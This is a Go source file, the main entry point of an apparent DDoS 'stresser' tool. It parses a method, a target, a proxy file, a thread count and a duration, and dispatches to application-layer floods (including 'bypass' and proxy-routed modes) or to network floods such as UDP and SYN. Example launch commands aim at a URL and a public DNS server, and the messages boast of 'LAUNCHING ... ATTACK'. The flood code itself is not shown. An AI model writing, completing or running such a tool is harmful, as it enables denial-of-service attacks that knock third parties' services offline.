package main

import (
	"flag"
	"fmt"
	"os"
	"stresser/internal/l4"
	"stresser/internal/l7"
)

func main() {
	method := flag.String("m", "", "Method: L7 → http,https,https1,https2,https3,bypass,browser,post | L4 → udp,udppower,tcp,tcpfull,syn,flood")
	target := flag.String("t", "", "Target (URL for L7, IP:port for L4)")
	proxyFile := flag.String("p", "proxies.txt", "Proxy file (L7 only)")
	threads := flag.Int("th", 500, "Threads")
	duration := flag.Int("d", 60, "Seconds")

	flag.Parse()

	if *method == "" || *target == "" {
		fmt.Println("Usage:")
		fmt.Println("L7: ./stresser -m https3 -t https://target.com -p proxies.txt -th 800 -d 40")
		fmt.Println("L4: ./stresser -m udppower -t 1.1.1.1:53 -th 1000 -d 30")
		fmt.Println("\nL7 methods: http https https1 https2 https3 bypass browser post")
		fmt.Println("L4 methods: udp udppower tcp tcpfull syn flood")
		os.Exit(1)
	}

	fmt.Printf("[+] FUCKING LAUNCHING %s ATTACK on %s | Threads: %d | Time: %ds\n\n", *method, *target, *threads, *duration)

	switch *method {
	case "http", "https", "https1", "https2", "https3", "bypass", "browser", "post":
		l7.Run(*method, *target, *proxyFile, *threads, *duration)
	case "udp", "udppower", "tcp", "tcpfull", "syn", "flood":
		l4.Run(*method, *target, *threads, *duration)
	default:
		fmt.Println("[-] Unknown method, dumbass.")
	}
}
